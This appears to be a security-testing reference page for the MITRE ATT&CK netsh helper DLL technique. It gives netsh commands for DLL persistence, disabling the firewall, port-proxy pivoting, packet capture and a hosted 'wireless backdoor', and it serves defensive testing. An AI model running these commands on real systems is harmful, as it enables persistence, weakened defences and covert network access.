# Netsh Helper DLL

MITRE ATT&CK Technique: [T1128](https://attack.mitre.org/wiki/Technique/T1128)

## A DLL can be registered to be loaded each time netsh.exe is executed, or for certain events.

Netsh interacts with other operating system components using dynamic-link library (DLL) files. Each Netsh helper DLL provides an extensive set of features called a context, which is a group of commands specific to a networking component. For example, Dhcpmon.dll provides netsh the context and set of commands necessary to configure and manage DHCP servers.

## Attackers can register a netsh helper with this command

     netsh.exe add helper C:\Path\file.dll

## The following registry key stores the paths to the helpers

    HKLM\SOFTWARE\Microsoft\Netsh

## Additional Netsh.exe testing we recommend

### Firewall Control

Input:

    netsh firewall set opmode [disable|enable]

### Netsh.exe Pivoting

Input:

    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1

Can also support v4tov6, v6tov6, and v6tov4

### Netsh.exe Sniffing

Input:

    netsh trace start capture=yes overwrite=no tracefile=<FilePath.etl>

to stop:

    netsh trace stop

### Netsh.exe Wireless backdoor

Input:

    netsh wlan set hostednetwork mode=[allow\|disallow]
    netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent\|temporary
    netsh wlan [start|stop] hostednetwork

Enables or disables hostednetwork service.
Complete hosted network setup for creating a wireless backdoor.
Starts or stops a wireless backdoor. See below to set it up.
